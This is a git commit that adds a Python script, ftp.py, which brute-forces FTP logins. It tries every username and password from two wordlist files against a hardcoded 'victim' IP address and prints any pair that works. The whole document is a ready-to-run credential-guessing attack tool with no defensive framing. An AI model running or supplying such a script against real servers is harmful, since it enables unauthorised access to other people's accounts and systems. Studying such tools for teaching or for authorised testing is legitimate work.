f597456985125ac03f3b0abe4f038e598b19770f
Iván Cabrera <103500562+ivancabrera02@users.noreply.github.com>
2022-09-04 23:39:08 +0200

    Add files via upload

---
+++ ftp.py
@@ -0,0 +1,27 @@
+import ftplib
+
+def brute(ip,usuario,password):
+	ftp = ftplib.FTP(ip)
+	try:
+		ftp.login(usuario,password)
+		ftp.quit()
+		print('Usuario: {}:{}'.format(usuario,password))
+	except:
+		print('No hubo conexion')
+
+def main():
+	ip = "192.168.0.2"  #aqui IP victima
+	usuarios = open('usuarios.txt','r')
+	usuarios = usuarios.read().split('\n')
+	passwords = open('contrasenas.txt','r')
+	passwords = passwords.read().split('\n')
+
+	for usuario in usuarios:
+		for p in passwords:
+			brute(ip,usuario,p)
+
+if __name__ == '__main__':
+	try:
+		main()
+	except KeyboardInterrupt:
+		exit()
